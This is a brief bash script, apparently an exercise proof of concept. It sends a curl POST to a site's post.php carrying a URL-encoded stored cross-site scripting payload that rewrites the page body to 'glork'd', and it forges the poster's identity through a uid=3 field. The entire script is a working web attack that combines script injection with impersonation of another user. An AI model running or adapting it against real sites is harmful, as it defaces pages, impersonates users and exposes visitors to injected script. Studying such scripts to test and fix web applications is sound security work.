#!/bin/bash

POST_URL="${1}/post.php"

echo "Attempting to post a comment as uid 3..."
echo "form=comment&parent=1&comment=%3Cscript%3Edocument.addEventListener%28%22DOMContentLoaded%22%2C+function%28e%29+%7B+document.body.innerHTML+%3D+%22%3Ch1%3Eglork%27d%3C%2Fh1%3E%22%3B+%7D%29%3B+%3C%2Fscript%3E&uid=3&submit=Post" | curl -L -d @- -s ${POST_URL} > /dev/null

echo ""
